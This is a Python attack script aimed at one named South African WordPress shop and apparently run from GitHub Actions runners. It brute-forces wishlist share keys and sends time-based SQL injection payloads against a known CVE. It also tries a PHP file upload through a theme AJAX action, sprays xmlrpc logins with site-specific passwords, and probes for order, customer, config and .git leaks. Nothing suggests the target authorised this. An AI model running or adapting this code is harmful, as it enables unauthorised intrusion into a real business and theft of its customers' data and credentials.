#!/usr/bin/env python3
"""kznvip Critical multi-vector smash on clean GHA egress.

Vectors: TI Wishlist share-key PRNG + SQLi, MWAI, Elementor, RevSlider,
ThemeREX, xmlrpc auth spray (tiny), WC private, Jetpack, path leaks.
"""
from __future__ import annotations

import hashlib
import json
import random
import re
import statistics
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

KNOWN_EMPTY = {"a4bc53", "bfa79e", "c631be", "e6b382", "534e24", "50bc47", "a6cf09"}
DAYS = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

results = {"ts": time.time(), "vectors": {}, "confirmed": [], "leads": []}


def date_r(dt: datetime) -> str:
    off = dt.strftime("%z")
    return (
        f"{DAYS[dt.weekday()]}, {dt.day:02d} {MONTHS[dt.month - 1]} {dt.year} "
        f"{dt.hour:02d}:{dt.minute:02d}:{dt.second:02d} {off}"
    )


def http(method, url, data=None, headers=None, timeout=40):
    h = {"User-Agent": "Mozilla/5.0 lurksek-critical", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body, dict(getattr(e, "headers", {}) or {})
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


def note(vec, entry):
    results["vectors"].setdefault(vec, []).append(entry)
    print(f"[{vec}] {entry}", flush=True)


# ---------- 1) Share-key PRNG smash (lean, completable) ----------
def gen_keys(n=18000):
    keys = set()
    specs = []
    for year in (2023, 2024, 2025, 2026):
        step = 1 if year >= 2024 else 2
        d = datetime(year, 1, 1, tzinfo=timezone(timedelta(hours=2)))
        end = (
            datetime(2026, 8, 27, tzinfo=timezone(timedelta(hours=2)))
            if year == 2026
            else datetime(year, 12, 31, tzinfo=timezone(timedelta(hours=2)))
        )
        while d <= end:
            for hour in (10, 12, 14, 16, 18):
                for minute in (0, 30):
                    for tz_h in (2, 0):
                        specs.append((d.year, d.month, d.day, hour, minute, tz_h))
            d += timedelta(days=step)
    random.shuffle(specs)
    for year, month, day, hour, minute, tz_h in specs:
        if len(keys) >= n:
            break
        try:
            dt = datetime(year, month, day, hour, minute, 0, tzinfo=timezone(timedelta(hours=tz_h)))
        except ValueError:
            continue
        dr = date_r(dt)
        for rnum in range(0, 3001):
            keys.add(hashlib.md5((dr + str(rnum)).encode()).hexdigest()[:6])
            if len(keys) >= n:
                break
    while len(keys) < n + 5000:
        keys.add(format(random.randint(0, 0xFFFFFF), "06x"))
    keys -= KNOWN_EMPTY
    out = list(keys)
    random.shuffle(out)
    return out


def probe_share(sk):
    code, t, body, _ = http("GET", f"{TARGET}/wp-json/wc/v3/wishlist/get_by_share_key/{sk}", timeout=18)
    if code != 200:
        return None
    try:
        j = json.loads(body.decode("utf-8", "replace"))
    except Exception:
        return None
    if isinstance(j, dict) and j.get("share_key"):
        return j
    return None


def products_for(sk):
    code, t, body, _ = http("GET", f"{TARGET}/wp-json/wc/v3/wishlist/{sk}/get_products?count=100", timeout=35)
    try:
        arr = json.loads(body.decode("utf-8", "replace"))
        n = len(arr) if isinstance(arr, list) else -1
    except Exception:
        arr, n = None, -1
    return code, n, arr


def msf_order(share, order):
    q = urllib.parse.urlencode({"_method": "GET", "order": order, "count": 10, "offset": 0})
    url = f"{TARGET}/?{q}"
    data = f"rest_route=/wc/v3/wishlist/{share}/get_products".encode()
    return http(
        "POST",
        url,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=120,
    )


def confirm_sqli(share):
    suite = []
    for lab, order in [
        ("ASC1", "ASC"),
        ("ASC2", "ASC"),
        ("S5a", ",(SELECT SLEEP(5))--"),
        ("S5b", ",(SELECT SLEEP(5))--"),
        ("S10a", ",(SELECT SLEEP(10))--"),
        ("S10b", ",(SELECT SLEEP(10))--"),
        ("ASC3", "ASC"),
        ("U5", "DESC LIMIT 0 UNION SELECT SLEEP(5),2,3,4,5,6,7,8,9,10-- "),
        ("U10", "DESC LIMIT 0 UNION SELECT SLEEP(10),2,3,4,5,6,7,8,9,10-- "),
    ]:
        code, t, body, _ = msf_order(share, order)
        suite.append({"label": lab, "code": code, "time": round(t, 3), "body": body[:60].decode("utf-8", "replace")})
        print(f"SQLI {lab} {code} {t:.2f}", flush=True)
    asc = [x["time"] for x in suite if x["label"].startswith("ASC") and x["code"] == 200]
    s5 = [x["time"] for x in suite if x["label"].startswith("S5") and x["code"] == 200]
    s10 = [x["time"] for x in suite if x["label"].startswith("S10") and x["code"] == 200]
    confirmed = False
    reason = ""
    if asc and s5 and s10:
        a = statistics.median(asc)
        if all(t >= a + 3.5 for t in s5) and all(t >= a + 8 for t in s10):
            confirmed = True
            reason = f"ASC={a} S5={s5} S10={s10}"
    return {"confirmed": confirmed, "reason": reason, "suite": suite, "share": share}


def smash_sharekeys():
    print("=== SHAREKEY SMASH ===", flush=True)
    keys = gen_keys(20000)
    probe_n = min(len(keys), 20000)
    probe_list = keys[:probe_n]
    found = []
    checked = 0
    with ThreadPoolExecutor(max_workers=40) as ex:
        futs = {ex.submit(probe_share, sk): sk for sk in probe_list}
        for fut in as_completed(futs):
            checked += 1
            if checked % 2000 == 0:
                print(f"share progress {checked}/{probe_n} found={len(found)}", flush=True)
            try:
                j = fut.result()
            except Exception:
                continue
            if j:
                found.append(j)
                print("FOUND_WL", j, flush=True)
    populated = []
    for j in found:
        sk = j.get("share_key")
        code, n, arr = products_for(sk)
        print(f"PRODUCTS {sk} n={n} code={code}", flush=True)
        if n and n > 0:
            populated.append({"share": sk, "n": n, "meta": j})
    out = {"probe_n": probe_n, "found": found, "populated": populated}
    if populated:
        sqli = confirm_sqli(populated[0]["share"])
        out["sqli"] = sqli
        if sqli["confirmed"]:
            results["confirmed"].append({"type": "CVE-2024-43917", "detail": sqli})
    results["vectors"]["sharekey"] = out
    print("sharekey done found=", len(found), "populated=", len(populated), flush=True)


# ---------- 2) MWAI / AI Engine ----------
def smash_mwai():
    print("=== MWAI ===", flush=True)
    paths = [
        ("GET", "/wp-json/mwai/v1/models"),
        ("GET", "/wp-json/mwai/v1/ai/models"),
        ("GET", "/wp-json/mwai-ui/v1/models"),
        ("GET", "/wp-json/mwai/v1/files"),
        ("GET", "/wp-json/mwai/v1/assistants"),
        ("POST", "/wp-json/mwai/v1/simpleChatbotQuery"),
        ("POST", "/wp-json/mwai/v1/ai/completions"),
        ("POST", "/?rest_route=/mwai/v1/simpleChatbotQuery"),
    ]
    for method, path in paths:
        url = TARGET + path if path.startswith("/") else path
        data = None
        headers = {}
        if method == "POST":
            data = json.dumps({"message": "ping", "botId": "default", "chatId": "crit"}).encode()
            headers = {"Content-Type": "application/json"}
            if "rest_route" in path:
                # form style
                data = "rest_route=/mwai/v1/simpleChatbotQuery&message=ping".encode()
                headers = {"Content-Type": "application/x-www-form-urlencoded"}
                url = TARGET + "/?rest_route=/mwai/v1/simpleChatbotQuery"
        code, t, body, _ = http(method, url, data=data, headers=headers, timeout=35)
        text = body[:200].decode("utf-8", "replace")
        note("mwai", {"path": path, "code": code, "time": round(t, 2), "body": text})
        if code == 200 and any(k in text.lower() for k in ["openai", "gpt", "claude", "answer", "success", "models"]):
            results["leads"].append({"vector": "mwai", "path": path, "code": code, "body": text})


# ---------- 3) Elementor / RevSlider / TRX uploads ----------
def smash_uploads():
    print("=== UPLOAD / AJAX ===", flush=True)
    # ThemeREX (known closed) recheck
    boundary = "----Crit" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    parts = []
    for k, v in [
        ("action", "trx_addons_uploads_save_data"),
        ("nonce", "08bbf42fbe"),
        ("name", "crit.php"),
        ("data", "<?php echo 'CRIT'; ?>"),
    ]:
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode())
    parts.append(f"--{boundary}--\r\n".encode())
    code, t, body, _ = http(
        "POST",
        TARGET + "/wp-admin/admin-ajax.php",
        data=b"".join(parts),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        timeout=40,
    )
    note("trx_upload", {"code": code, "time": round(t, 2), "body": body[:120].decode("utf-8", "replace")})

    # RevSlider classic AJAX actions
    for action in [
        "revslider_ajax_action",
        "revslider_ajax_call_front",
        "revslider_show_image",
    ]:
        data = urllib.parse.urlencode({"action": action, "client_action": "get_slider_html", "data": "{}"}).encode()
        code, t, body, _ = http(
            "POST",
            TARGET + "/wp-admin/admin-ajax.php",
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=35,
        )
        note("revslider", {"action": action, "code": code, "body": body[:150].decode("utf-8", "replace")})

    # Elementor
    for path in [
        "/wp-json/elementor/v1/documents",
        "/wp-json/elementor/v1/globals",
        "/wp-json/elementor/v1/site-editor/templates",
        "/elementor/",
    ]:
        code, t, body, _ = http("GET", TARGET + path, timeout=30)
        note("elementor", {"path": path, "code": code, "body": body[:120].decode("utf-8", "replace")})


# ---------- 4) xmlrpc tiny spray + multicall ----------
def smash_xmlrpc():
    print("=== XMLRPC ===", flush=True)
    # listMethods already known; try getUserBlogs with weak pairs (tiny set)
    users = ["Kznbk90iub0e", "admin", "kznemvifiv", "kznvip", "root"]
    passwords = [
        "Kznbk90iub0e",
        "kznvip",
        "kznvip123",
        "Password1!",
        "admin",
        "admin123",
        "Afrihost1!",
        "kznemvifiv",
        "Welcome1",
        "P@ssw0rd",
    ]
    for u in users:
        for p in passwords:
            xml = f"""<?xml version="1.0"?>
<methodCall><methodName>wp.getUsersBlogs</methodName>
<params><param><value><string>{u}</string></value></param>
<param><value><string>{p}</string></value></param></params></methodCall>"""
            code, t, body, _ = http(
                "POST",
                TARGET + "/xmlrpc.php",
                data=xml.encode(),
                headers={"Content-Type": "text/xml"},
                timeout=25,
            )
            text = body.decode("utf-8", "replace")
            hit = "isAdmin" in text or "blogid" in text.lower() or ("faultCode" not in text and code == 200 and "methodResponse" in text)
            note("xmlrpc", {"user": u, "pass": p, "code": code, "hit": hit, "body": text[:120]})
            if hit and "fault" not in text.lower():
                results["confirmed"].append({"type": "xmlrpc_weak_creds", "user": u, "pass": p, "body": text[:300]})
                print("CRITICAL_XMLRPC_CREDS", u, p, flush=True)
                return


# ---------- 5) WC / Jetpack / CF7 / private ----------
def smash_wc_jetpack():
    print("=== WC/JETPACK/CF7 ===", flush=True)
    gets = [
        "/wp-json/wc/v3/orders",
        "/wp-json/wc/v3/customers",
        "/wp-json/wc/v3/reports/sales",
        "/wp-json/wc/v3/system_status",
        "/wp-json/wc/private/settings",
        "/wp-json/wc/store/cart",
        "/wp-json/wc/store/checkout",
        "/wp-json/wc-admin/options",
        "/wp-json/wc-admin/onboarding/tasks",
        "/wp-json/jetpack/v4/connection",
        "/wp-json/jetpack/v4/site",
        "/wp-json/contact-form-7/v1/contact-forms",
        "/wp-json/wp/v2/users/1?context=edit",
        "/wp-json/wp/v2/settings",
        "/?rest_route=/wp/v2/users&context=edit",
    ]
    for path in gets:
        code, t, body, _ = http("GET", TARGET + path, timeout=30)
        text = body[:180].decode("utf-8", "replace")
        note("wc_jp", {"path": path, "code": code, "body": text})
        if code == 200 and any(k in text.lower() for k in ["email", "billing", "total_sales", "consumer_key", "database"]):
            results["leads"].append({"vector": "wc_jp", "path": path, "body": text})


# ---------- 6) Hosting / path disclosure ----------
def smash_hosting():
    print("=== HOSTING PATHS ===", flush=True)
    paths = [
        "/wp-content/uploads/",
        "/wp-content/debug.log",
        "/.git/HEAD",
        "/.git/config",
        "/server-status",
        "/phpinfo.php",
        "/info.php",
        "/wp-config.php.bak",
        "/wp-config.php.old",
        "/wp-config.txt",
        "/readme.html",
        "/license.txt",
        "/wp-content/plugins/revslider/includes/template.class.php",
        "/wp-content/plugins/revslider/temp/update_extract/",
        "/wp-content/uploads/revslider/",
        "/wp-json/trx_addons/v1/",
        "/wp-json/trx_addons/v1/sc/",
    ]
    for path in paths:
        code, t, body, _ = http("GET", TARGET + path, timeout=25)
        text = body[:150].decode("utf-8", "replace")
        note("hosting", {"path": path, "code": code, "len": len(body), "body": text})
        if code == 200 and any(k in text for k in ["ref:", "[core]", "DB_PASSWORD", "kznemvifiv", "Index of"]):
            results["leads"].append({"vector": "hosting", "path": path, "body": text})
            if "DB_PASSWORD" in text or "[core]" in text:
                results["confirmed"].append({"type": "source_or_git_leak", "path": path, "body": text[:500]})


def main():
    smash_hosting()
    smash_wc_jetpack()
    smash_mwai()
    smash_uploads()
    smash_xmlrpc()
    smash_sharekeys()
    results["confirmed_count"] = len(results["confirmed"])
    results["leads_count"] = len(results["leads"])
    for p in (OUT / "critical_results.json", Path("out/critical_results.json")):
        p.write_text(json.dumps(results, indent=2, default=str))
    print(
        "DONE confirmed=",
        results["confirmed_count"],
        "leads=",
        results["leads_count"],
        flush=True,
    )
    if results["confirmed"]:
        print("CRITICAL_CONFIRMED", json.dumps(results["confirmed"], indent=2)[:2000], flush=True)


if __name__ == "__main__":
    main()
